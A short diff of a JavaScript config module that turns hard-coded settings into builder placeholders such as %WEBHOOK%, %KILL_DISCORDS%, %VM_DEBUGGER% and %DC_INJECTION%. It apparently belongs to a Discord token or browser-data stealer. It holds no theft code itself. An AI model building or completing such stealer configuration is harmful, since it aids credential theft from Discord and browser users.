@@ -1,13 +1,13 @@
 module.exports = () => {
     return {
-        "webhook": [process.env.WEBHOOK],
-        "errorMessage": "",
+        "webhook": ["%WEBHOOK%"],
+        "errorMessage": "%ERRO_MESSAGE%",
         "kill":{ 
-            "discords": false,
-            "browsers": true,
+            "discords": "%KILL_DISCORDS%",
+            "browsers": false,
         }, 
-        "debugger": true, 
-        "injection": true, 
+        "debugger": "%VM_DEBUGGER%", 
+        "injection": "%DC_INJECTION%", 
     }
 }
 
